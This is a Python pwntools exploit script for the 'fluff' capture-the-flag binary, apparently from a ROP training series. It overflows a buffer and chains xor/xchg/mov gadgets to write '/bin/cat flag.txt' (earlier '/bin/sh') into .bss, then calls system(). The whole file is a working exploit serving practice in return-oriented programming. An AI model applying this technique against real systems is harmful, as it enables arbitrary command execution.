"""

"""

from pwn import *
#context.log_level = 'debug'
elf = ELF('./fluff')
p = process('./fluff')
#p = remote('localhost', 7777 )

command = b'/bin/sh'
command = b'/bin/cat flag.txt'
bss = 0x601060

payload = b''
payload += b'A'*0x20
payload += b'BBBBBBBB'
#payload += p64( 0x4008c3 + 1 ) #ret
for i in range( 0, len( command ), 8 ):
    payload += p64( 0x400822 ) #xor r11,r11;pop r14
    payload += p64( 0 )
    payload += p64( 0x400832 ) #pop r12
    payload += p64( bss + i )
    payload += p64( 0x40082f ) #xor r11,r12;pop r12
    payload += command[i:i+8].ljust( 8, b'\0')
    payload += p64( 0x400840 ) #xchg r11,r10;pop r15
    payload += p64( 0 )
    payload += p64( 0x400822 ) #xor r11,r11;pop r14
    payload += p64( 0 )
    payload += p64( 0x40082f ) #xor r11,r12;pop r12
    payload += p64( 0 )
    payload += p64( 0x40084e ) #mov Q[r10],r11;pop r13;pop r12;xor B[r10],r12
    payload += p64( 0 )
    payload += p64( 0 )
payload += p64( 0x4008c3 ) #pop rdi
payload += p64( bss )
payload += p64( elf.plt["system"] )

p.recvuntil('> ')
p.sendline( payload )
info( 'flag :%s', p.recv() )
